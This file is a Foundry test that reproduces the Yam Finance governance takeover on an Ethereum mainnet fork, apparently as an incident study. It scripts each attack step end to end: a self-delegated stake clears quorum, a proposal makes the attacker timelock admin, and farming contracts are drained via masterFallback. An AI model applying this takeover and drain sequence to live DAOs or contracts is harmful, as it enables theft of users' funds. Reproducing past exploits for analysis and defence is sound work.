// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Yam Finance - governance takeover of a dormant, low-turnout DAO - Ethereum.
// An attacker bought ~504K YAM (~3.3% of supply), self-delegated it, and - because the DAO was dormant
// with almost no active voting participation - that stake alone cleared BOTH the proposal threshold and
// the passage quorum. A single-action proposal (setPendingAdmin(attacker) on the YAM Timelock) then handed
// the attacker full admin control of the entire protocol, which was used to drain the legacy UMA farming
// contracts. Reported extraction ~$121K: 23.50 WETH + 763 UMA from UMAFarmingMar, 24.59 WETH from
// UMAFarmingFeb, cashed out via FixedFloat as ~48.15 ETH.
//
// Attacker EOA          : 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982
// Proposal creation tx  : 0xf3c9b1d7094bd11e6aa065c5efb009afa682a961c72e3f4c1bc20e6a25d2e25a (block 25884997)
// Proposal #45          : single action setPendingAdmin(attacker) on the Timelock, empty description ("0x")
// YamGovernorAlpha      : 0x2DA253835967D6E721C6c077157F9c9742934aeA (verified)
// YAM Timelock          : 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5 (verified; Compound-style)
// YAM token (votes)     : 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521 (verified)
// UMAFarmingMar (uGAS-MAR21): 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2 (verified)
// UMAFarmingFeb (uGAS-FEB21): 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835 (verified)
//
// HOW THE STAKE WAS ACQUIRED (real capital, NOT a flash loan): on-chain the attacker held 0 YAM at block
// 25884983 and 504,427 YAM one block later (25884984), acquired via an aggregator swap (router
// 0xac4c6e21..., spoofed "snwap" selector 0x5f3bd1c8) paid for with the attacker's own funds. That stake
// then sat locked through the ENTIRE ~12-day governance cycle (propose -> vote -> 5-day timelock -> accept
// -> reduce delay -> drain), so it cannot be flash-borrowed - it is genuine at-risk capital. This PoC forks
// at block 25884984, i.e. after that open-market purchase but BEFORE the self-delegation, and reconstructs
// every governance step from there with real typed calls. Forking with the pre-existing purchased stake is
// the same shape as any PoC that forks with a victim's real pre-existing balance; the exploit itself (the
// governance takeover and the drain) is reconstructed in full, not read from settled state.
//
// VOTE MECHANICS CONFIRMED (against verified YamGovernorAlpha source + live chain reads):
//   proposalThreshold() = 50000 * 10**24 = 5e28   ("1% of YAM")
//   quorumVotes()       = 200000 * 10**24 = 2e29   ("4% of YAM")
//   votingDelay() = 1 block, votingPeriod() = 12345 blocks
//   state(): a proposal is Defeated if `forVotes <= againstVotes || forVotes < quorumVotes()`, otherwise
//            Succeeded once voting ends. There is no separate minimum-"for" threshold beyond quorum, and
//            passage does NOT require any other address to vote.
//   The attacker's self-delegated weight, read on-chain via yam.getPriorVotes at the proposal's start block,
//   was 201664062636824099514174674941 (~2.016e29). That single number is > proposalThreshold (so they could
//   propose) AND > quorumVotes with zero against-votes (so state() returns Succeeded). No other voter was
//   needed - dormancy is the whole exploit: on an active DAO, opposition votes would push forVotes below the
//   againstVotes bar or rally counter-quorum. Here nobody showed up.
//
// ROOT CAUSE OF THE DRAIN (verified UMAFarmingMar/Feb source):
//   gov of both farming contracts == the Timelock. Once the attacker owns the Timelock they queue
//   `_setPendingGov(attacker)` through it, execute it, and call `_acceptGov()` directly to become gov.
//   As gov they call `_settleExpired()` (-> minter.settleExpired() on the long-expired uGAS EMP, releasing
//   the WETH collateral into the farming contract) and then the gov-only escape hatch:
//       function masterFallback(address target, bytes memory data) public onlyGovOrSubGov {
//           target.call.value(0)(data);
//       }
//   which makes ANY call from the farming contract - here WETH/UMA transfer(attacker, balance) - draining it.
//
// This PoC reconstructs the whole chain end to end with named typed calls and no bytecode/calldata replay:
// self-delegate -> propose -> vote -> advance past voting -> queue -> warp the 5-day timelock -> execute ->
// acceptAdmin -> queue+execute a setDelay(12h) -> queue+execute _setPendingGov on both farms -> _acceptGov ->
// _settleExpired -> masterFallback drains. Asserts the reproduced on-chain extraction (~48.08 WETH + ~763.1
// UMA); the FixedFloat conversion to ~48.15 ETH is an off-chain CEX/swap service, out of fork scope.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IYAM {
    function delegate(address delegatee) external;
    function delegates(address) external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function getPriorVotes(address account, uint256 blockNumber) external view returns (uint256);
    function getCurrentVotes(address account) external view returns (uint256);
}

interface IGovernorAlpha {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        string[] memory signatures,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);
    function castVote(uint256 proposalId, bool support) external;
    function queue(uint256 proposalId) external;
    function execute(uint256 proposalId) external payable;
    function state(uint256 proposalId) external view returns (uint8);
    function quorumVotes() external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
}

interface ITimelock {
    function admin() external view returns (address);
    function delay() external view returns (uint256);
    function pendingAdmin() external view returns (address);
    function acceptAdmin() external;
    function queueTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 eta)
        external returns (bytes32);
    function executeTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 eta)
        external payable returns (bytes memory);
    function MINIMUM_DELAY() external view returns (uint256);
}

interface IUMAFarming {
    function gov() external view returns (address);
    function pendingGov() external view returns (address);
    function _acceptGov() external;
    function _settleExpired() external;
    function masterFallback(address target, bytes memory data) external;
}

contract YamFinanceExploit is Test {
    address internal constant ATTACKER = 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982;

    IGovernorAlpha internal constant GOV = IGovernorAlpha(0x2DA253835967D6E721C6c077157F9c9742934aeA);
    ITimelock internal constant TIMELOCK = ITimelock(0x8b4f1616751117C38a0f84F9A146cca191ea3EC5);
    IYAM internal constant YAM = IYAM(0x0AaCfbeC6a24756c20D41914F2caba817C0d8521);

    IUMAFarming internal constant MAR = IUMAFarming(0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2);
    IUMAFarming internal constant FEB = IUMAFarming(0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835);

    IERC20 internal constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal constant UMA = IERC20(0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828);

    uint256 internal constant TWELVE_HOURS = 43200; // Timelock MINIMUM_DELAY, the reduced value

    function setUp() public {
        // Fork after the attacker's open-market YAM purchase (block 25884984) but before self-delegation
        // (which happened at 25884985). At this block the attacker holds 504,427 YAM and delegates == 0x0.
        vm.createSelectFork("mainnet", 25884984);
    }

    function test_YamGovernanceTakeover() public {
        // ---- preconditions from real chain state ----
        assertEq(YAM.delegates(ATTACKER), address(0), "attacker should not be delegated yet at fork");
        assertEq(TIMELOCK.admin(), address(GOV), "governor should be the timelock admin at fork");
        assertEq(TIMELOCK.delay(), 432000, "timelock delay should be 5 days at fork");
        assertEq(MAR.gov(), address(TIMELOCK), "MAR gov should be the timelock");
        assertEq(FEB.gov(), address(TIMELOCK), "FEB gov should be the timelock");

        uint256 stake = YAM.balanceOf(ATTACKER);
        emit log_named_decimal_uint("attacker YAM stake (purchased, at risk)", stake, 18);

        vm.startPrank(ATTACKER);

        // ---- 1) self-delegate the purchased YAM to arm voting power ----
        YAM.delegate(ATTACKER);
        assertEq(YAM.delegates(ATTACKER), ATTACKER, "self-delegation failed");
        vm.roll(block.number + 2); // let the delegation checkpoint become a strictly-prior block

        uint256 votes = YAM.getCurrentVotes(ATTACKER);
        emit log_named_uint("attacker vote weight (underlying denom)", votes);
        emit log_named_uint("quorumVotes()", GOV.quorumVotes());
        emit log_named_uint("proposalThreshold()", GOV.proposalThreshold());
        assertGt(votes, GOV.proposalThreshold(), "stake below proposal threshold");
        assertGt(votes, GOV.quorumVotes(), "stake below quorum - self-weight alone must clear it");

        // ---- 2) propose #45 equivalent: single action setPendingAdmin(attacker) on the Timelock ----
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory sigs = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets[0] = address(TIMELOCK);
        values[0] = 0;
        sigs[0] = "setPendingAdmin(address)";
        calldatas[0] = abi.encode(ATTACKER);

        uint256 proposalId = GOV.propose(targets, values, sigs, calldatas, "0x");
        emit log_named_uint("proposalId", proposalId);

        // ---- 3) advance to Active and cast the attacker's own votes for it ----
        vm.roll(block.number + 2); // block.number now > startBlock -> Active
        GOV.castVote(proposalId, true);

        // ---- 4) advance past the voting period -> Succeeded (forVotes > quorum, 0 against) ----
        vm.roll(block.number + GOV.votingPeriod() + 1);
        assertEq(GOV.state(proposalId), uint8(4), "proposal should be Succeeded"); // 4 = Succeeded

        // ---- 5) queue in the timelock, warp the full 5-day delay, execute ----
        GOV.queue(proposalId);
        assertEq(GOV.state(proposalId), uint8(5), "proposal should be Queued"); // 5 = Queued
        vm.warp(block.timestamp + 432000 + 1); // real timelock delay at this block
        GOV.execute(proposalId);

        // ---- 6) accept admin: the attacker now controls the entire protocol ----
        assertEq(TIMELOCK.pendingAdmin(), ATTACKER, "attacker should be pendingAdmin after execute");
        TIMELOCK.acceptAdmin();
        assertEq(TIMELOCK.admin(), ATTACKER, "attacker should now be timelock admin");

        // ---- 7) reduce the timelock delay 5d -> 12h (setDelay must originate from the timelock itself) ----
        _timelockDo(address(TIMELOCK), "setDelay(uint256)", abi.encode(TWELVE_HOURS), TIMELOCK.delay());
        assertEq(TIMELOCK.delay(), TWELVE_HOURS, "delay should be reduced to 12h");

        // ---- 8) make the attacker pendingGov of both farming contracts via the timelock, then accept ----
        uint256 d = TIMELOCK.delay();
        _timelockDo(address(MAR), "_setPendingGov(address)", abi.encode(ATTACKER), d);
        _timelockDo(address(FEB), "_setPendingGov(address)", abi.encode(ATTACKER), d);
        MAR._acceptGov();
        FEB._acceptGov();
        assertEq(MAR.gov(), ATTACKER, "attacker should be MAR gov");
        assertEq(FEB.gov(), ATTACKER, "attacker should be FEB gov");

        // ---- 9) settle the expired uGAS positions to release WETH collateral, then drain via masterFallback ----
        uint256 wethBefore = WETH.balanceOf(ATTACKER);
        uint256 umaBefore = UMA.balanceOf(ATTACKER);

        MAR._settleExpired();
        uint256 marWeth = WETH.balanceOf(address(MAR));
        uint256 marUma = UMA.balanceOf(address(MAR));
        MAR.masterFallback(address(WETH), abi.encodeWithSignature("transfer(address,uint256)", ATTACKER, marWeth));
        MAR.masterFallback(address(UMA), abi.encodeWithSignature("transfer(address,uint256)", ATTACKER, marUma));

        FEB._settleExpired();
        uint256 febWeth = WETH.balanceOf(address(FEB));
        FEB.masterFallback(address(WETH), abi.encodeWithSignature("transfer(address,uint256)", ATTACKER, febWeth));

        vm.stopPrank();

        uint256 wethGained = WETH.balanceOf(ATTACKER) - wethBefore;
        uint256 umaGained = UMA.balanceOf(ATTACKER) - umaBefore;
        emit log_named_decimal_uint("WETH drained from MAR", marWeth, 18);
        emit log_named_decimal_uint("UMA  drained from MAR", marUma, 18);
        emit log_named_decimal_uint("WETH drained from FEB", febWeth, 18);
        emit log_named_decimal_uint("TOTAL WETH drained to attacker", wethGained, 18);
        emit log_named_decimal_uint("TOTAL UMA  drained to attacker", umaGained, 18);

        // ---- assertions: reproduce the reported on-chain extraction ----
        // MAR released 23.499 WETH from the minter; FEB released 24.586 WETH; MAR held 763.10 UMA rewards.
        assertApproxEqRel(marWeth, 23.499 ether, 0.01e18, "MAR WETH ~= 23.50");
        assertApproxEqRel(febWeth, 24.586 ether, 0.01e18, "FEB WETH ~= 24.59");
        assertApproxEqRel(umaGained, 763.1 ether, 0.01e18, "UMA ~= 763");
        assertGt(wethGained, 48 ether, "total WETH extraction should exceed 48 WETH");
        // Off-chain: the ~48.08 WETH + ~763 UMA were cashed out via FixedFloat to ~48.15 ETH (~$121K).
    }

    // Queue a single transaction through the (attacker-owned) Timelock at eta = now + delay, warp to eta,
    // then execute it. Signature/data are passed as typed args exactly as the Timelock expects (it builds
    // the selector from the signature string; data is the ABI-encoded arguments only).
    function _timelockDo(address target, string memory signature, bytes memory data, uint256 delay) internal {
        uint256 eta = block.timestamp + delay;
        TIMELOCK.queueTransaction(target, 0, signature, data, eta);
        vm.warp(eta + 1);
        TIMELOCK.executeTransaction(target, 0, signature, data, eta);
    }
}
